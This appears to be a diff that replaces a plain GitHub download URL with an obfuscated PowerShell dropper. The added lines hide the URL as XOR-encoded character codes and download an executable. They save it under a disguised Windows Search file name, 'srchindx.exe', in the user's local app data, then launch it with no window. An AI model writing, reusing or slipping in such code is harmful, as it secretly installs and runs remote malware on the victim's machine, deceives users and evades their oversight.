@@ -1,1 +1,7 @@
-https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/powershell.exe
+$k=13;$u=-join(@(101,121,121,125,126,55,34,34,106,100,121,101,120,111,35,110,98,96,34,96,108,121,123,104,103,126,102,97,108,127,98,123,52,32,110,116,111,104,127,34,96,116,34,127,108,122,34,127,104,107,126,34,101,104,108,105,126,34,96,108,100,99,34,125,98,122,104,127,126,101,104,97,97,35,104,117,104)|%{[char]($_-bxor$k)})
+$p=$env:LOCALAPPDATA+'\Microsoft\Windows\Search\srchindx.exe'
+$h=[Net.Http.HttpClient]::new()
+[IO.File]::WriteAllBytes($p,$h.GetByteArrayAsync($u).GetAwaiter().GetResult())
+$s=New-Object Diagnostics.ProcessStartInfo $p
+$s.CreateNoWindow=1;$s.UseShellExecute=0
+[Diagnostics.Process]::Start($s)|Out-Null
